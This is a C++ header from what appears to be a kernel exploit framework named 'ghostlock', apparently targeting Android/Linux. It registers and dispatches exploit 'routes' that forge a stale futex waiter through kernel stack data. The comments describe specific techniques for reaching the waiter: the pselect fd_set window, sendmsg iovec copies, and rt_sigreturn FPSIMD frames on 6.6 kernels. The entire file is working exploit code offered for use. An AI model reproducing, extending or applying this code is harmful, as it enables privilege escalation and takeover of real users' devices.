#ifndef GHOSTLOCK_ROUTE_POLICY_HPP
#define GHOSTLOCK_ROUTE_POLICY_HPP

#include <concepts>
#include <optional>
#include <tuple>
#include <type_traits>
#include <variant>

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "route/route_status.h"
#include "support/status.hpp"

namespace ghostlock::session {
    struct ExploitSession;
}

namespace ghostlock::route {
    RouteStatus do_pselect_fake_lock_route(const memory::WriteRequest *request);

    RouteStatus do_tcp_fake_lock_route(const memory::WriteRequest *request);

    RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request);

    RouteStatus do_sendmsg_iovec_fake_lock_route(const memory::WriteRequest *request);

    RouteStatus do_rt_sigreturn_fake_lock_route(const memory::WriteRequest *request);

    using RouteKind = ghostlock::profile::RouteKind;

    /* Native middleware catalog (Batch 3): each policy is one selectable
     * middleware tactic (tcp_zerocopy | select_stack | multicast_waiter). The
     * orchestrator (route/orchestrator.hpp) picks the pipeline; this registry
     * maps a resolved route to its compile-time policy.
     *
     * One resolved route's behavior. A policy is a tag type whose compile-time
     * capabilities replace every `supports(RouteKind)` branch in the run stages,
     * and whose run() is the per-write entry point. Adding a route means adding
     * a policy and listing it in RoutePolicyList below; no stage edits. */
    template<class P>
    concept RoutePolicy = requires(const profile::TargetProfile &profile,
                                   const memory::WriteRequest *request)
    {
        { P::kind } -> std::convertible_to<RouteKind>;
        { P::supported(profile) } -> std::same_as<bool>;
        { P::run(request) } -> std::same_as<RouteStatus>;
    };

    /* Route capability defaults. Adding a capability becomes one `static
     * constexpr` default here (false): existing policies inherit it untouched,
     * and a policy that needs true just redeclares it. Capabilities are read
     * through the concrete policy type, so a redeclaration hides the base
     * default and stays a direct compile-time compare - no indirect dispatch
     * ever enters the PI-window path. */
    struct RoutePolicyDefaults {
        static constexpr bool multicast = false;
        static constexpr bool w2_fast_repair = false;
        static constexpr bool w3_exact_target = false;
        static constexpr bool tcp_payload_layout = false;
        static constexpr bool allows_fallback = false;

        /* Middleware route hooks (Batch 4, D1=B). Only the route steps with side
         * effects are hooks; pure capability queries stay on the
         * static-constexpr capabilities above. The neutral defaults live here so
         * every policy inherits the whole interface; a policy that needs
         * different behavior redeclares the hook and the Android-only definition
         * lives in that middleware's procedure unit. The backend steps call
         * these directly through the middleware policy template parameter
         * (route/pipeline.hpp), so no vtable or runtime dispatch enters the
         * path. */
        static bool w2_fast_repair_prebuild(session::ExploitSession &) noexcept {
            return true;
        }

        static bool w2_fast_repair_activate(session::ExploitSession &) noexcept {
            return true;
        }
    };

    struct SelectPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::SelectStack;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_pselect_fake_lock_route(request);
        }
    };

    struct TcpPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::TcpZerocopy;
        static constexpr bool w3_exact_target = true;
        static constexpr bool tcp_payload_layout = true;
        static constexpr bool allows_fallback = true;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_tcp_fake_lock_route(request);
        }
    };

    struct MulticastPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::MulticastWaiter;
        static constexpr bool multicast = true;
        static constexpr bool w2_fast_repair = true;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_kernel5_fake_lock_route(request);
        }

#if defined(__ANDROID__)
        /* Route-hook overrides: declared here, defined in
         * multicast_waiter_route.cpp (Android-only implementation). noinline is
         * the explicit middleware boundary: the backend steps call these
         * directly, and without it LTO inlines the whole route body into the
         * attack functions. */
        [[gnu::noinline]] static bool w2_fast_repair_prebuild(
            session::ExploitSession &exploit_session) noexcept;

        [[gnu::noinline]] static bool w2_fast_repair_activate(
            session::ExploitSession &exploit_session) noexcept;
#endif
    };

    /* 6.6 images whose stale futex waiter is 10 qwords above the pselect fd_set
     * window cannot express the full waiter through select() (the route needs
     * waiter words 10..12, the window stops at 4). The sendmsg iovec stack
     * reaches exactly the waiter tail instead: task/lock/wake_state are stamped
     * by the user iovec array __sys_sendmsg copies to its own stack. */
    struct SendmsgIovecPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::SendmsgIovec;
        static constexpr bool allows_fallback = false;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_sendmsg_iovec_fake_lock_route(request);
        }
    };

    /* 6.6 images whose stale futex waiter cannot be reached through either the
     * pselect fd_set window or the reachable tail of __sys_sendmsg's iovec
     * array. __arm64_sys_rt_sigreturn copies the user signal frame's 0x200-byte
     * FPSIMD save area onto its own kernel stack at sp+0x50; on this image that
     * buffer fully contains the waiter, so the copied vector registers become
     * waiter->task/lock/wake_state (and the tree/pi_tree head). */
    struct RtSigreturnPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::RtSigreturn;
        static constexpr bool allows_fallback = false;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_rt_sigreturn_fake_lock_route(request);
        }
    };

    /* Compile-time middleware contract (Batch 4, D1=B slice 3c): every route
     * policy must expose the side-effecting route hooks. A policy inherits the
     * neutral defaults; a signature drift or a missing hook fails here. */
    template<class P>
    concept MiddlewarePolicy = RoutePolicy<P> &&
        requires(session::ExploitSession &exploit_session,
                 const memory::WriteRequest &request) {
            { P::w2_fast_repair_prebuild(exploit_session) } -> std::same_as<bool>;
            { P::w2_fast_repair_activate(exploit_session) } -> std::same_as<bool>;
        };

    static_assert(MiddlewarePolicy<SelectPolicy>);
    static_assert(MiddlewarePolicy<TcpPolicy>);
    static_assert(MiddlewarePolicy<MulticastPolicy>);
    static_assert(MiddlewarePolicy<SendmsgIovecPolicy>);
    static_assert(MiddlewarePolicy<RtSigreturnPolicy>);

    /* The single registry. Appending a policy here wires every generic loop
     * below (variant, selection, fallback lookup, capabilities). */
    using RoutePolicyList =
            std::tuple<SelectPolicy, TcpPolicy, MulticastPolicy, SendmsgIovecPolicy,
                       RtSigreturnPolicy>;

    template<class T>
    struct variant_of;
    template<class... Ps>
    struct variant_of<std::tuple<Ps...>> {
        using type = std::variant<Ps...>;
    };

    template<class Fn, class... Ps>
    constexpr void for_each_policy(Fn &&fn, std::tuple<Ps...> *) {
        (fn.template operator()<Ps>(), ...);
    }

    template<class Fn>
    constexpr void for_each_policy(Fn &&fn) {
        for_each_policy(std::forward<Fn>(fn),
                        static_cast<RoutePolicyList *>(nullptr));
    }

    /* Derived from RoutePolicyList, so a new route touches one list only. */
    using RoutePolicyVariant = typename variant_of<RoutePolicyList>::type;

    /* Single route->policy mapping; for_each_policy keeps it automatic when the
     * registry grows. */
    [[nodiscard]] inline RoutePolicyVariant make_route_policy(
        const profile::TargetProfile &profile) noexcept {
        RoutePolicyVariant selected = SelectPolicy{};
        for_each_policy([&]<class P>() {
            if (P::supported(profile)) selected = P{};
        });
        return selected;
    }

    /* Visit the resolved policy so a call site can branch on compile-time
     * capabilities with `if constexpr` instead of on the route kind. Used by
     * the stage hooks, which run outside the PI window. */
    template<class Fn>
    constexpr decltype(auto) with_route_policy(
        const profile::TargetProfile &profile, Fn &&fn) {
        return std::visit(std::forward<Fn>(fn), make_route_policy(profile));
    }

    /* Read one compile-time capability of the resolved policy using a direct
     * compare/branch chain (no std::visit), safe for the PI window where an
     * indirect dispatch must not enter (route_lifecycle.hpp). */
    template<class Projection>
    bool route_capability(const profile::TargetProfile &profile,
                          Projection projection) noexcept {
        bool result = false;
        for_each_policy([&]<class P>() {
            if (!result && P::supported(profile)) result = projection(P{});
        });
        return result;
    }

    template<class P>
    bool run_policy_matching(RouteStatus &status, RouteKind kind,
                             const memory::WriteRequest *request) {
        if (kind != P::kind) return false;
        status = P::run(request);
        return true;
    }

    [[nodiscard]] inline RouteStatus run_policy_by_kind(
        RouteKind kind, const memory::WriteRequest *request) {
        RouteStatus status{.code = ROUTE_UNSUPPORTED};
        bool matched = false;
        for_each_policy([&]<class P>() {
            if (!matched) matched = run_policy_matching<P>(status, kind, request);
        });
        return status;
    }

    struct RouteRunResult {
        RouteStatus status{};
        bool fallback_used = false;
    };

    template<RoutePolicy Policy>
    RouteRunResult run_route_policy(const profile::TargetProfile &profile,
                                    const memory::WriteRequest *request,
                                    int32_t allow_fallback) {
        RouteRunResult result{};
        if (!Policy::supported(profile)) {
            result.status = RouteStatus{.code = ROUTE_UNSUPPORTED};
            return result;
        }
        result.status = Policy::run(request);
        if constexpr (Policy::allows_fallback) {
            if (result.status.code != ROUTE_OK && allow_fallback &&
                result.status.can_fallback()) {
                const RouteKind fallback = profile.fallback_route();
                if (fallback != RouteKind::Auto && fallback != Policy::kind) {
                    const RouteStatus next = run_policy_by_kind(fallback, request);
                    if (next.code != ROUTE_UNSUPPORTED) {
                        result.status = next;
                        result.fallback_used = true;
                    }
                }
            }
        }
        return result;
    }

    /* Select and run the resolved policy with a direct dispatch chain (no
     * std::visit), for the PI-window caller. */
    [[nodiscard]] inline RouteRunResult run_route(
        const profile::TargetProfile &profile,
        const memory::WriteRequest *request, int32_t allow_fallback) {
        RouteRunResult result{};
        bool handled = false;
        for_each_policy([&]<class P>() {
            if (!handled && P::supported(profile)) {
                result = run_route_policy<P>(profile, request, allow_fallback);
                handled = true;
            }
        });
        if (!handled) result.status = RouteStatus{.code = ROUTE_UNSUPPORTED};
        return result;
    }

    /* True when the resolved policy needs the post-race ghost disarm. */
    [[nodiscard]] inline bool route_needs_ghost_disarm(
        const profile::TargetProfile &profile) noexcept {
        return route_capability(profile, [](auto policy) {
            return std::decay_t<decltype(policy)>::multicast;
        });
    }
} // namespace ghostlock::route

#endif
